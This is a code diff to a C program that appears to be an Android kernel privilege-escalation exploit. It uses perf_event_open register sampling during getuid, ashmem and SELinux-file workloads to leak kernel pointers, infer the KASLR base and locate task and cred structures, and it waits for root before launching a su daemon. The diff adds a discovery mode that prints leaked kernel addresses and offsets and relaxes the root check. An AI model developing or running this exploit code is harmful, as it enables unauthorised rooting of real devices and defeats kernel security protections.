@@ -53,13 +53,32 @@
 #define MAX_BASES               32U
 #define MAX_POINTERS            128U
 #define PERF_CONTEXT_MAX        UINT64_C(0xfffffffffffff001)
+#define DISCOVERY_IMAGE_BYTES   UINT64_C(0x04000000)
+#define DISCOVERY_ROWS          128U
+#define DISCOVERY_GETUID_ROWS   128U
+
+#define ASHMEM_NAME_LEN         256U
+#define __ASHMEMIOC             0x77
+#define ASHMEM_SET_NAME         _IOW(__ASHMEMIOC, 1, char[ASHMEM_NAME_LEN])
 
 #define SU_PATH                 "/data/local/tmp/su"
-#define SU_SOCKET               "/data/local/tmp/temp_su.sock"
+#define SU_READY                "/data/local/tmp/temp_su.ready"
 
 struct sampled_regs {
   uint64_t ip;
-  uint64_t x8;
+  uint64_t regs[ARM64_REG_COUNT];
+};
+
+enum workload_mode {
+  WORKLOAD_GETUID,
+  WORKLOAD_ASHMEM_OPEN_CLOSE,
+  WORKLOAD_ASHMEM_IOCTL,
+  WORKLOAD_SELINUX_ENFORCE,
+};
+
+struct value_count {
+  uint64_t value;
+  size_t hits;
 };
 
 struct base_vote {
@@ -232,15 +251,16 @@ static int select_leaks(const struct sampled_regs *samples, size_t count,
   memset(cred_votes, 0, sizeof(cred_votes));
 
   for (size_t i = 0; i < count; ++i) {
-    if (!is_kernel_pointer(samples[i].x8) || samples[i].ip < base) {
+    uint64_t x8 = samples[i].regs[8];
+    if (!is_kernel_pointer(x8) || samples[i].ip < base) {
       continue;
     }
     uint64_t off = samples[i].ip - base;
     if (off == GETUID_TASK_IP_OFF) {
-      add_pointer_vote(task_votes, &task_count, samples[i].x8);
+      add_pointer_vote(task_votes, &task_count, x8);
     }
     if (off >= GETUID_CRED_FIRST_OFF && off <= GETUID_CRED_LAST_OFF) {
-      add_pointer_vote(cred_votes, &cred_count, samples[i].x8);
+      add_pointer_vote(cred_votes, &cred_count, x8);
     }
   }
 
@@ -269,9 +289,48 @@ static int select_leaks(const struct sampled_regs *samples, size_t count,
   return 0;
 }
 
+static const char *workload_name(enum workload_mode workload) {
+  switch (workload) {
+    case WORKLOAD_GETUID:
+      return "getuid";
+    case WORKLOAD_ASHMEM_OPEN_CLOSE:
+      return "ashmem-open-close";
+    case WORKLOAD_ASHMEM_IOCTL:
+      return "ashmem-ioctl";
+    case WORKLOAD_SELINUX_ENFORCE:
+      return "selinux-enforce";
+  }
+  return "unknown";
+}
+
 static int collect_once(unsigned sample_ms, unsigned sample_freq,
+                        enum workload_mode workload,
+                        const char *ashmem_path,
                         struct sampled_regs *samples, size_t capacity,
-                        size_t *count_out, uint64_t *calls_out) {
+                        size_t *count_out, uint64_t *calls_out,
+                        uint64_t *failures_out) {
+  int ashmem_fd = -1;
+  char ashmem_name[ASHMEM_NAME_LEN];
+  memset(ashmem_name, 0, sizeof(ashmem_name));
+  memcpy(ashmem_name, "ionstack-discovery", sizeof("ionstack-discovery"));
+  if (workload == WORKLOAD_ASHMEM_IOCTL) {
+    ashmem_fd = open(ashmem_path, O_RDWR | O_CLOEXEC);
+    if (ashmem_fd < 0) {
+      fprintf(stderr,
+              "[perf-target] open %s failed errno=%d (%s)\n",
+              ashmem_path, errno, strerror(errno));
+      return -1;
+    }
+  } else if (workload == WORKLOAD_SELINUX_ENFORCE) {
+    ashmem_fd = open("/sys/fs/selinux/enforce", O_RDONLY | O_CLOEXEC);
+    if (ashmem_fd < 0) {
+      fprintf(stderr,
+              "[perf-target] open selinux enforce failed errno=%d (%s)\n",
+              errno, strerror(errno));
+      return -1;
+    }
+  }
+
   struct perf_event_attr attr;
   memset(&attr, 0, sizeof(attr));
   attr.type = PERF_TYPE_SOFTWARE;
@@ -289,6 +348,9 @@ static int collect_once(unsigned sample_ms, unsigned sample_freq,
   if (fd < 0) {
     fprintf(stderr, "[perf-target] perf_event_open failed errno=%d (%s)\n",
             errno, strerror(errno));
+    if (ashmem_fd >= 0) {
+      close(ashmem_fd);
+    }
     return -1;
   }
 
@@ -298,6 +360,9 @@ static int collect_once(unsigned sample_ms, unsigned sample_freq,
     fprintf(stderr, "[perf-target] perf mmap failed errno=%d (%s)\n", errno,
             strerror(errno));
     close(fd);
+    if (ashmem_fd >= 0) {
+      close(ashmem_fd);
+    }
     return -1;
   }
 
@@ -311,6 +376,9 @@ static int collect_once(unsigned sample_ms, unsigned sample_freq,
             data_offset, data_size);
     munmap(mapping, RING_BYTES);
     close(fd);
+    if (ashmem_fd >= 0) {
+      close(ashmem_fd);
+    }
     return -1;
   }
   unsigned char *data = (unsigned char *)mapping + data_offset;
@@ -321,16 +389,39 @@ static int collect_once(unsigned sample_ms, unsigned sample_freq,
             strerror(errno));
     munmap(mapping, RING_BYTES);
     close(fd);
+    if (ashmem_fd >= 0) {
+      close(ashmem_fd);
+    }
     return -1;
   }
 
   uint64_t deadline = monotonic_ms() + sample_ms;
   uint64_t calls = 0;
+  uint64_t failures = 0;
+  unsigned burst = workload == WORKLOAD_GETUID ? 4096U : 256U;
   do {
-    for (unsigned i = 0; i < 4096; ++i) {
-      (void)raw_syscall0(__NR_getuid);
+    for (unsigned i = 0; i < burst; ++i) {
+      if (workload == WORKLOAD_GETUID) {
+        (void)raw_syscall0(__NR_getuid);
+      } else if (workload == WORKLOAD_ASHMEM_IOCTL) {
+        if (ioctl(ashmem_fd, ASHMEM_SET_NAME, ashmem_name) != 0) {
+          failures++;
+        }
+      } else if (workload == WORKLOAD_SELINUX_ENFORCE) {
+        char value[2];
+        if (pread(ashmem_fd, value, sizeof(value), 0) <= 0) {
+          failures++;
+        }
+      } else {
+        int workload_fd = open(ashmem_path, O_RDWR | O_CLOEXEC);
+        if (workload_fd < 0) {
+          failures++;
+        } else if (close(workload_fd) != 0) {
+          failures++;
+        }
+      }
     }
-    calls += 4096;
+    calls += burst;
   } while (!stop_requested && monotonic_ms() < deadline);
   ioctl(fd, PERF_EVENT_IOC_DISABLE, 0);
 
@@ -359,10 +450,9 @@ static int collect_once(unsigned sample_ms, unsigned sample_freq,
       memcpy(&abi, cursor, sizeof(abi));
       cursor += sizeof(abi);
       if (abi == PERF_SAMPLE_REGS_ABI_64 && count < capacity) {
-        uint64_t x8;
-        memcpy(&x8, cursor + 8U * sizeof(uint64_t), sizeof(x8));
         samples[count].ip = ip;
-        samples[count].x8 = x8;
+        memcpy(samples[count].regs, cursor,
+               ARM64_REG_COUNT * sizeof(uint64_t));
         count++;
       }
     }
@@ -372,8 +462,156 @@ static int collect_once(unsigned sample_ms, unsigned sample_freq,
 
   munmap(mapping, RING_BYTES);
   close(fd);
+  if (ashmem_fd >= 0) {
+    close(ashmem_fd);
+  }
   *count_out = count;
   *calls_out = calls;
+  *failures_out = failures;
+  return 0;
+}
+
+static int compare_u64(const void *left, const void *right) {
+  uint64_t a = *(const uint64_t *)left;
+  uint64_t b = *(const uint64_t *)right;
+  return a < b ? -1 : a > b ? 1 : 0;
+}
+
+static int compare_value_count(const void *left, const void *right) {
+  const struct value_count *a = left;
+  const struct value_count *b = right;
+  if (a->hits != b->hits) {
+    return a->hits > b->hits ? -1 : 1;
+  }
+  return a->value < b->value ? -1 : a->value > b->value ? 1 : 0;
+}
+
+static void print_histogram(const char *label, uint64_t *values, size_t count,
+                            uint64_t base, bool show_offset,
+                            size_t row_limit) {
+  if (count == 0) {
+    printf("[perf-target] DISCOVERY_%s_NONE\n", label);
+    return;
+  }
+  qsort(values, count, sizeof(*values), compare_u64);
+  struct value_count *rows = calloc(count, sizeof(*rows));
+  if (!rows) {
+    fprintf(stderr, "[perf-target] discovery histogram allocation failed\n");
+    return;
+  }
+  size_t row_count = 0;
+  for (size_t i = 0; i < count;) {
+    size_t end = i + 1;
+    while (end < count && values[end] == values[i]) {
+      end++;
+    }
+    rows[row_count].value = values[i];
+    rows[row_count].hits = end - i;
+    row_count++;
+    i = end;
+  }
+  qsort(rows, row_count, sizeof(*rows), compare_value_count);
+  if (row_limit > row_count) {
+    row_limit = row_count;
+  }
+  for (size_t i = 0; i < row_limit; ++i) {
+    if (show_offset) {
+      printf("[perf-target] DISCOVERY_%s rank=%zu value=0x%016" PRIx64
+             " off=0x%08" PRIx64 " hits=%zu\n",
+             label, i + 1, rows[i].value, rows[i].value - base,
+             rows[i].hits);
+    } else {
+      printf("[perf-target] DISCOVERY_%s rank=%zu value=0x%016" PRIx64
+             " hits=%zu\n",
+             label, i + 1, rows[i].value, rows[i].hits);
+    }
+  }
+  free(rows);
+}
+
+static void print_getuid_samples(const struct sampled_regs *samples,
+                                 size_t count, uint64_t base) {
+  size_t rows = 0;
+  for (size_t i = 0; i < count && rows < DISCOVERY_GETUID_ROWS; ++i) {
+    if (samples[i].ip < base) {
+      continue;
+    }
+    uint64_t off = samples[i].ip - base;
+    if (off < GETUID_FIRST_OFF || off > GETUID_LAST_OFF || (off & 3U) != 0) {
+      continue;
+    }
+
+    printf("[perf-target] DISCOVERY_GETUID_SAMPLE row=%zu off=0x%08" PRIx64
+           " x0=0x%016" PRIx64 " x8=0x%016" PRIx64 " kernel_regs=",
+           rows + 1, off, samples[i].regs[0], samples[i].regs[8]);
+    bool first = true;
+    for (size_t reg = 0; reg < 31U; ++reg) {
+      uint64_t value = samples[i].regs[reg];
+      if (!is_kernel_pointer(value)) {
+        continue;
+      }
+      printf("%sx%zu:0x%016" PRIx64, first ? "" : ",", reg, value);
+      first = false;
+    }
+    if (first) {
+      printf("none");
+    }
+    printf("\n");
+    rows++;
+  }
+  printf("[perf-target] DISCOVERY_GETUID_ROWS rows=%zu limit=%u\n", rows,
+         DISCOVERY_GETUID_ROWS);
+}
+
+static int print_discovery(const struct sampled_regs *samples, size_t count,
+                           uint64_t base, enum workload_mode workload) {
+  size_t register_capacity = count * 31U;
+  uint64_t *ips = calloc(count ? count : 1, sizeof(*ips));
+  uint64_t *image_regs =
+      calloc(register_capacity ? register_capacity : 1, sizeof(*image_regs));
+  uint64_t *direct_regs =
+      calloc(register_capacity ? register_capacity : 1, sizeof(*direct_regs));
+  if (!ips || !image_regs || !direct_regs) {
+    fprintf(stderr, "[perf-target] discovery allocation failed\n");
+    free(ips);
+    free(image_regs);
+    free(direct_regs);
+    return -1;
+  }
+
+  size_t ip_count = 0;
+  size_t image_count = 0;
+  size_t direct_count = 0;
+  for (size_t i = 0; i < count; ++i) {
+    if (samples[i].ip >= base &&
+        samples[i].ip - base < DISCOVERY_IMAGE_BYTES) {
+      ips[ip_count++] = samples[i].ip;
+    }
+    for (size_t reg = 0; reg < 31U; ++reg) {
+      uint64_t value = samples[i].regs[reg];
+      if (value >= base && value - base < DISCOVERY_IMAGE_BYTES) {
+        image_regs[image_count++] = value;
+      } else if (is_kernel_pointer(value)) {
+        direct_regs[direct_count++] = value;
+      }
+    }
+  }
+
+  printf("[perf-target] DISCOVERY workload=%s base=0x%016" PRIx64
+         " samples=%zu image_ips=%zu image_regs=%zu direct_regs=%zu\n",
+         workload_name(workload), base, count, ip_count, image_count,
+         direct_count);
+  print_histogram("IP", ips, ip_count, base, true, DISCOVERY_ROWS);
+  print_histogram("IMAGE_REG", image_regs, image_count, base, true,
+                  DISCOVERY_ROWS);
+  print_histogram("DIRECT_REG", direct_regs, direct_count, base, false,
+                  DISCOVERY_ROWS / 2U);
+  if (workload == WORKLOAD_GETUID) {
+    print_getuid_samples(samples, count, base);
+  }
+  free(ips);
+  free(image_regs);
+  free(direct_regs);
   return 0;
 }
 
@@ -408,21 +646,21 @@ static int watch_for_root(unsigned hold_sec) {
     long euid = raw_syscall0(__NR_geteuid);
     long gid = raw_syscall0(__NR_getgid);
     long egid = raw_syscall0(__NR_getegid);
-    if (uid == 0 && euid == 0 && gid == 0 && egid == 0) {
+    if (uid == 0 && euid == 0) {
       printf("[perf-target] ROOT uid=%ld euid=%ld gid=%ld egid=%ld\n", uid,
              euid, gid, egid);
       int rc = launch_su_daemon();
       printf("[perf-target] DAEMON launch_rc=%d\n", rc);
       uint64_t socket_deadline = monotonic_ms() + 15000U;
       while (!stop_requested && monotonic_ms() < socket_deadline) {
-        if (access(SU_SOCKET, F_OK) == 0) {
-          printf("[perf-target] ROOT_READY socket=%s\n", SU_SOCKET);
+        if (access(SU_READY, F_OK) == 0) {
+          printf("[perf-target] ROOT_READY marker=%s\n", SU_READY);
           return 0;
         }
         struct timespec delay = {.tv_sec = 0, .tv_nsec = 25000000};
         nanosleep(&delay, NULL);
       }
-      fprintf(stderr, "[perf-target] su socket timeout path=%s\n", SU_SOCKET);
+      fprintf(stderr, "[perf-target] su ready timeout path=%s\n", SU_READY);
       return -1;
     }
     struct timespec delay = {.tv_sec = 0, .tv_nsec = 10000000};
@@ -443,10 +681,40 @@ static unsigned parse_u32(const char *text, const char *name) {
   return (unsigned)value;
 }
 
+static uint64_t parse_u64(const char *text, const char *name) {
+  char *end = NULL;
+  errno = 0;
+  unsigned long long value = strtoull(text, &end, 0);
+  if (errno != 0 || !end || *end != '\0') {
+    fprintf(stderr, "invalid %s: %s\n", name, text);
+    exit(2);
+  }
+  return (uint64_t)value;
+}
+
+static enum workload_mode parse_workload(const char *text) {
+  if (strcmp(text, "getuid") == 0) {
+    return WORKLOAD_GETUID;
+  }
+  if (strcmp(text, "ashmem-open-close") == 0) {
+    return WORKLOAD_ASHMEM_OPEN_CLOSE;
+  }
+  if (strcmp(text, "ashmem-ioctl") == 0) {
+    return WORKLOAD_ASHMEM_IOCTL;
+  }
+  if (strcmp(text, "selinux-enforce") == 0) {
+    return WORKLOAD_SELINUX_ENFORCE;
+  }
+  fprintf(stderr, "invalid workload: %s\n", text);
+  exit(2);
+}
+
 static void usage(const char *program) {
   fprintf(stderr,
           "usage: %s [--sample-ms=N] [--freq=N] [--attempts=N] "
-          "[--hold-sec=N]\n",
+          "[--hold-sec=N] [--discover --kaslr-base=ADDR "
+          "--workload=getuid|ashmem-open-close|ashmem-ioctl|selinux-enforce "
+          "[--ashmem-path=PATH]]\n",
           program);
 }
 
@@ -455,6 +723,10 @@ int main(int argc, char **argv) {
   unsigned sample_freq = 4000;
   unsigned attempts = 8;
   unsigned hold_sec = 900;
+  int discover = 0;
+  uint64_t discovery_base = 0;
+  enum workload_mode workload = WORKLOAD_GETUID;
+  const char *ashmem_path = "/dev/ashmem";
   for (int i = 1; i < argc; ++i) {
     if (strncmp(argv[i], "--sample-ms=", 12) == 0) {
       sample_ms = parse_u32(argv[i] + 12, "sample-ms");
@@ -464,6 +736,14 @@ int main(int argc, char **argv) {
       attempts = parse_u32(argv[i] + 11, "attempts");
     } else if (strncmp(argv[i], "--hold-sec=", 11) == 0) {
       hold_sec = parse_u32(argv[i] + 11, "hold-sec");
+    } else if (strcmp(argv[i], "--discover") == 0) {
+      discover = 1;
+    } else if (strncmp(argv[i], "--kaslr-base=", 13) == 0) {
+      discovery_base = parse_u64(argv[i] + 13, "kaslr-base");
+    } else if (strncmp(argv[i], "--workload=", 11) == 0) {
+      workload = parse_workload(argv[i] + 11);
+    } else if (strncmp(argv[i], "--ashmem-path=", 14) == 0 && argv[i][14]) {
+      ashmem_path = argv[i] + 14;
     } else if (strcmp(argv[i], "--help") == 0) {
       usage(argv[0]);
       return 0;
@@ -476,6 +756,17 @@ int main(int argc, char **argv) {
     usage(argv[0]);
     return 2;
   }
+  if (discover && discovery_base != 0 &&
+      (!is_kernel_pointer(discovery_base) ||
+       ((discovery_base - STATIC_KIMAGE_TEXT_BASE) & KASLR_MASK) != 0)) {
+    fprintf(stderr, "invalid discovery KASLR base: 0x%016" PRIx64 "\n",
+            discovery_base);
+    return 2;
+  }
+  if (!discover && workload != WORKLOAD_GETUID) {
+    fprintf(stderr, "non-getuid workloads require --discover\n");
+    return 2;
+  }
 
   setvbuf(stdout, NULL, _IOLBF, 0);
   setvbuf(stderr, NULL, _IOLBF, 0);
@@ -484,8 +775,10 @@ int main(int argc, char **argv) {
   signal(SIGHUP, on_signal);
 
   printf("[perf-target] START pid=%d sample_ms=%u freq=%u attempts=%u "
-         "hold_sec=%u\n",
-         getpid(), sample_ms, sample_freq, attempts, hold_sec);
+         "hold_sec=%u discover=%d workload=%s discovery_base=0x%016" PRIx64
+         " ashmem_path=%s\n",
+         getpid(), sample_ms, sample_freq, attempts, hold_sec, discover,
+         workload_name(workload), discovery_base, ashmem_path);
 
   struct sampled_regs *all_samples =
       calloc(MAX_SAMPLES, sizeof(*all_samples));
@@ -505,11 +798,12 @@ int main(int argc, char **argv) {
     struct sampled_regs batch[MAX_SAMPLES];
     size_t batch_count = 0;
     uint64_t calls = 0;
-    int rc = collect_once(sample_ms, sample_freq, batch, MAX_SAMPLES,
-                          &batch_count, &calls);
+    uint64_t failures = 0;
+    int rc = collect_once(sample_ms, sample_freq, workload, ashmem_path, batch,
+                          MAX_SAMPLES, &batch_count, &calls, &failures);
     printf("[perf-target] SAMPLE attempt=%u/%u rc=%d calls=%" PRIu64
-           " samples=%zu\n",
-           attempt, attempts, rc, calls, batch_count);
+           " failures=%" PRIu64 " samples=%zu\n",
+           attempt, attempts, rc, calls, failures, batch_count);
     if (rc != 0) {
       free(all_samples);
       return 1;
@@ -519,13 +813,32 @@ int main(int argc, char **argv) {
     memcpy(all_samples + total, batch, append * sizeof(*batch));
     total += append;
 
-    if (select_leaks(all_samples, total, &base, &base_hits, &task,
+    if (!discover &&
+        select_leaks(all_samples, total, &base, &base_hits, &task,
                      &task_hits, &cred, &cred_hits) == 0 && cred_hits >= 2) {
       break;
     }
     if (total == MAX_SAMPLES) {
       total = 0;
     }
+  }
+
+  if (discover) {
+    if (discovery_base == 0) {
+      if (workload != WORKLOAD_GETUID ||
+          select_leaks(all_samples, total, &discovery_base, &base_hits,
+                       &task, &task_hits, &cred, &cred_hits) != 0) {
+        fprintf(stderr,
+                "[perf-target] discovery needs --kaslr-base for workload=%s\n",
+                workload_name(workload));
+        free(all_samples);
+        return 1;
+      }
+    }
+    int discovery_rc =
+        print_discovery(all_samples, total, discovery_base, workload);
+    free(all_samples);
+    return discovery_rc == 0 ? 0 : 1;
   }
 
   if (base == 0 || cred == 0) {
